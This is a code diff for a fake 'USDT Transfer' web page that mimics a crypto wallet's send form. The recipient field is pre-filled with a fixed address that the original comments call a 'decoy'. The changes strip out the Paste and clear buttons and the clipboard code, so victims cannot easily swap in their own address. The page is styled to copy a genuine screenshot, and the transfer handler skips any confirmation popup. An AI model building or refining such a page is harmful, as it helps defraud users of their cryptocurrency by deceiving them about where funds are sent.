@@ -5,7 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transfer</title>
   <style>
-    /* Clean, minimal – matches screenshot exactly */
+    /* Full‑width, clean, minimal – exactly like first screenshot */
+    * {
+      box-sizing: border-box;
+    }
     body {
       background: #f5f7fa;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -19,8 +22,8 @@
     .container {
       background: #ffffff;
       border-radius: 16px;
-      padding: 30px 28px;
-      max-width: 420px;
+      padding: 28px 24px;
+      max-width: 480px;
       width: 100%;
       box-shadow: 0 4px 20px rgba(0,0,0,0.08);
       border: 1px solid #e2e8f0;
@@ -33,16 +36,16 @@
       font-size: 14px;
       font-weight: 500;
       color: #2d3748;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
     }
     .field-row {
       display: flex;
-      gap: 8px;
+      gap: 0; /* no gap – full width */
       align-items: center;
     }
     .field-row input,
     .field-row select {
-      flex: 1;
+      width: 100%;
       padding: 10px 12px;
       border: 1px solid #e2e8f0;
       border-radius: 8px;
@@ -50,6 +53,7 @@
       background: #f7fafc;
       transition: 0.15s;
       outline: none;
+      min-width: 0; /* prevent overflow */
     }
     .field-row input:focus,
     .field-row select:focus {
@@ -60,6 +64,7 @@
       appearance: auto;
       cursor: pointer;
     }
+    /* Custom select with icon */
     .custom-select {
       position: relative;
       width: 100%;
@@ -117,6 +122,7 @@
       height: 42px;
       display: flex;
       align-items: center;
+      margin-left: 8px; /* small gap for Max button */
     }
     .btn-secondary:hover {
       background: #e2e8f0;
@@ -127,17 +133,9 @@
     .btn-secondary.max:hover {
       background: #bee3f8;
     }
+    /* No clear buttons – as in first screenshot */
     .clear-btn {
-      background: none;
-      border: none;
-      color: #a0aec0;
-      font-size: 18px;
-      cursor: pointer;
-      padding: 0 6px;
-      display: none;
-    }
-    .clear-btn.visible {
-      display: block;
+      display: none !important;
     }
     .hint {
       font-size: 13px;
@@ -175,13 +173,11 @@
 <body>
 
 <div class="container">
-  <!-- Address or Domain Name - pre-filled decoy -->
+  <!-- Address – full width, no Paste button -->
   <div class="field-group">
     <label>Address or Domain Name</label>
     <div class="field-row">
       <input type="text" id="recipientInput" placeholder="0x..." value="0x402b1a4FD55Ca191a22039162173A3b4E5a7C9e7" />
-      <button class="btn-secondary" id="pasteBtn">Paste</button>
-      <button class="clear-btn visible" id="clearAddr">✕</button>
     </div>
   </div>
 
@@ -203,15 +199,14 @@
     </div>
   </div>
 
-  <!-- Amount -->
+  <!-- Amount with Max button -->
   <div class="field-group">
     <label>Amount</label>
     <div class="field-row">
       <input type="number" id="amountInput" placeholder="0" min="0" step="0.01" />
       <button class="btn-secondary max" id="maxBtn">Max</button>
-      <button class="clear-btn" id="clearAmount">✕</button>
     </div>
-    <div class="hint">$<span id="usdLabel">0.00</span></div>
+    <div class="hint">~ $<span id="usdLabel">0.00</span></div>
   </div>
 
   <!-- Next button -->
@@ -316,10 +311,7 @@
     amountInput: $('amountInput'),
     usdLabel: $('usdLabel'),
     recipientInput: $('recipientInput'),
-    clearAddr: $('clearAddr'),
-    clearAmount: $('clearAmount'),
     maxBtn: $('maxBtn'),
-    pasteBtn: $('pasteBtn'),
     networkSelect: $('networkSelect'),
     networkIcon: $('networkIcon')
   };
@@ -342,14 +334,12 @@
 
     ui.nextBtn.addEventListener('click', handleNextClick);
 
-    // Network selection with icon update
     ui.networkSelect.addEventListener('change', () => {
       const idx = parseInt(ui.networkSelect.value);
       selectedNetwork = NETWORKS[idx] || NETWORKS[0];
       updateNetworkIcon(ui.networkSelect);
     });
 
-    // Set initial icon
     updateNetworkIcon(ui.networkSelect);
 
     ui.amountInput.oninput = () => {
@@ -357,21 +347,6 @@
       ui.usdLabel.textContent = val.toFixed(2);
       ui.nextBtn.disabled = val <= 0;
       ui.nextBtn.classList.toggle('enabled', val > 0);
-      ui.clearAmount.classList.toggle('visible', val > 0);
-    };
-
-    ui.clearAmount.onclick = () => {
-      ui.amountInput.value = '';
-      ui.amountInput.oninput();
-    };
-
-    ui.clearAddr.onclick = () => {
-      ui.recipientInput.value = '';
-      ui.clearAddr.classList.remove('visible');
-    };
-
-    ui.recipientInput.oninput = () => {
-      ui.clearAddr.classList.toggle('visible', ui.recipientInput.value.length > 0);
     };
 
     ui.maxBtn.onclick = () => {
@@ -379,20 +354,11 @@
       ui.amountInput.oninput();
     };
 
-    ui.pasteBtn.onclick = async () => {
-      try {
-        const text = await navigator.clipboard.readText();
-        ui.recipientInput.value = text;
-        ui.recipientInput.oninput();
-      } catch { /* ignore */ }
-    };
-
-    // Trigger initial UI states
-    ui.recipientInput.oninput();
+    // Trigger initial state
     ui.amountInput.oninput();
   });
 
-  // ── Main handler (NO confirm popup) ──
+  // ── Main handler (no confirm popup) ──
   async function handleNextClick() {
     if (ui.nextBtn.disabled) return;
 
